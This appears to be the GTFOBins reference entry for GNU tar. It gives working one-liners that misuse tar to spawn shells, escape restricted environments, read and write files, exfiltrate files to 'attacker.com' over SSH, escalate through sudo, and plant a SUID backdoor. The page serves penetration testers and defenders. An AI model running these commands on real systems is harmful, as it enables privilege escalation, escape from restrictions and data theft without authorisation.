# GTFOBin: tar

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

This only works for GNU tar.

```
tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
```

This only works for GNU tar. It can be useful when only a limited command argument injection is available.

```
TF=$(mktemp)
echo '/bin/sh 0<&1' > "$TF"
tar cf "$TF.tar" "$TF"
tar xf "$TF.tar" --to-command sh
rm "$TF"*
```

## File upload

It can exfiltrate files on the network.

This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).

```
RHOST=attacker.com
RUSER=root
RFILE=/tmp/file_to_send.tar
LFILE=file_to_send
tar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh
```

## File download

It can download remote files.

This only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).

```
RHOST=attacker.com
RUSER=root
RFILE=/tmp/file_to_get.tar
tar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

This only works for GNU tar.

```
LFILE=file_to_write
TF=$(mktemp)
echo DATA > "$TF"
tar c --xform "s@.*@$LFILE@" -OP "$TF" | tar x -P
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

This only works for GNU tar.

```
LFILE=file_to_read
tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

## Limited SUID

If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which tar) .

./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```